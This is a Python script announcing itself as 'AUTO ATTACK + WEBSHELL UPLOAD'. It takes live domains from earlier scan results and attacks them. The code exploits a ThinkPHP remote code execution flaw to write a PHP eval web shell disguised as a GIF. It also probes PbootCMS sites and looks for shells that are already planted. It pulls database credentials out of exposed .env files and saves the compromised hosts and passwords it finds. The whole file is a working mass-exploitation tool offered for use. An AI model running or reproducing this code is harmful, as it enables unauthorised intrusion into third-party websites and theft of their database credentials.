#!/usr/bin/env python3
import subprocess, json, re, time
from datetime import datetime
LOG = '/tmp/attack_log.txt'
SHELL_PHP = 'GIF89a;<?php @eval($_POST["c"]);?>'

def log(msg):
    ts = datetime.now().strftime('%H:%M:%S')
    line = f'[{ts}] {msg}'
    print(line, flush=True)
    with open(LOG, 'a') as f: f.write(line + '\n')

def curl(url, timeout=10, method='GET', data=None):
    cmd = ['curl', '-sk', '--connect-timeout', '5', '--max-time', str(timeout), '-A', 'Mozilla/5.0']
    if method == 'POST': cmd += ['-X', 'POST']
    if data: cmd += ['-d', data]
    cmd += ['-D', '/tmp/ahdr.txt', url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        try:
            with open('/tmp/ahdr.txt') as f: hdrs = f.read()
        except: hdrs = ''
        return r.returncode, r.stdout[:2000], hdrs
    except: return -1, '', ''

def attack_thinkphp(domain):
    hits = []
    base = 'http://' + domain
    for sp in ['/shell.php', '/1.php', '/public/shell.php']:
        write_cmd = 'echo ' + repr(SHELL_PHP) + ' > ' + sp.lstrip('/')
        rce = base + '/index.php?s=captcha' + '&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=' + write_cmd
        curl(rce)
        code, body, _ = curl(base + sp)
        if code == 0 and 'GIF89a' in body:
            h = {'domain': domain, 'type': 'ThinkPHP_RCE', 'shell': base + sp, 'password': 'c'}
            hits.append(h)
            log(f'  [!] SHELL: {base}{sp}')
            return hits
    return hits

def attack_pboot(domain):
    hits = []
    base = 'http://' + domain
    code, body, _ = curl(base + '/admin.php')
    if 'PbootCMS' in body or code in ('200', '302'):
        log(f'  [*] Admin: {base}/admin.php')
    code, body, _ = curl(base + '/1.php')
    if code == 0 and len(body) > 5:
        h = {'domain': domain, 'type': 'PbootCMS_shell', 'shell': base + '/1.php', 'password': 'c'}
        hits.append(h)
        log(f'  [!] Existing shell: {base}/1.php')
    return hits

def attack_env(domain):
    hits = []
    base = 'http://' + domain
    code, body, _ = curl(base + '/.env')
    if code == '200' and len(body) > 10:
        dbh = re.search(r'DB_HOST=(\S+)', body)
        dbu = re.search(r'DB_USERNAME=(\S+)', body) or re.search(r'DB_USER=(\S+)', body)
        dbp = re.search(r'DB_PASSWORD=(\S+)', body)
        if dbh and dbu and dbp:
            h = {'domain': domain, 'type': 'env_leak', 'db_host': dbh.group(1), 'db_user': dbu.group(1), 'db_pass': dbp.group(1)}
            hits.append(h)
            log(f'  [!] DB: {dbu.group(1)}:{dbp.group(1)}@{dbh.group(1)}')
    return hits

def check_common(domain):
    hits = []
    base = 'http://' + domain
    for fn in ['1.php', 'shell.php', 'cmd.php', 'hunter_win.php']:
        code, body, _ = curl(base + '/' + fn)
        if code == 0 and len(body) > 5 and ('GIF89a' in body or 'eval' in body or '' in body):
            h = {'domain': domain, 'type': 'existing_shell', 'shell': base + '/' + fn}
            hits.append(h)
            log(f'  [!] Shell found: {base}/{fn}')
    code, _, _ = curl(base + '/backup.zip')
    if code == '200':
        hits.append({'domain': domain, 'type': 'backup_zip', 'url': base + '/backup.zip'})
        log(f'  [!] backup.zip: {base}/backup.zip')
    return hits

def main():
    log('='*50)
    log('AUTO ATTACK + WEBSHELL UPLOAD')
    log('='*50)
    all_hits = []
    for sf in ['/tmp/overnight_scan_results.json', '/tmp/phase2_scan_results.json']:
        try:
            with open(sf) as f: r = json.load(f)
            tgts = r.get('targets', r)
            log(f'Loaded {len(tgts)} from {sf}')
            for d, info in tgts.items():
                if not isinstance(info, dict) or not info.get('alive'): continue
                pw = info.get('powered', '').lower()
                cm = info.get('cms', '').lower()
                if 'thinkphp' in pw or 'thinkphp' in cm:
                    all_hits.extend(attack_thinkphp(d))
                if 'pboot' in pw or 'pboot' in cm:
                    all_hits.extend(attack_pboot(d))
                all_hits.extend(attack_env(d))
                all_hits.extend(check_common(d))
        except FileNotFoundError:
            log(f'Not found: {sf}')
    
    shells = [h for h in all_hits if 'shell' in h.get('type','')]
    dbs = [h for h in all_hits if 'env_leak' in h.get('type','')]
    log(f'\nDONE: {len(all_hits)} hits | Shells: {len(shells)} | DB leaks: {len(dbs)}')
    for s in shells:
        log(f'  SHELL: {s["domain"]} -> {s["shell"]} (pass={s.get("password","c")})')
    for db in dbs:
        log(f'  DB: {db["domain"]} -> {db.get("db_user","?")}:{db.get("db_pass","?")}@{db.get("db_host","?")}')
    with open('/tmp/attack_results.json', 'w') as f:
        json.dump(all_hits, f, indent=2, ensure_ascii=False)

if __name__ == '__main__':
    main()
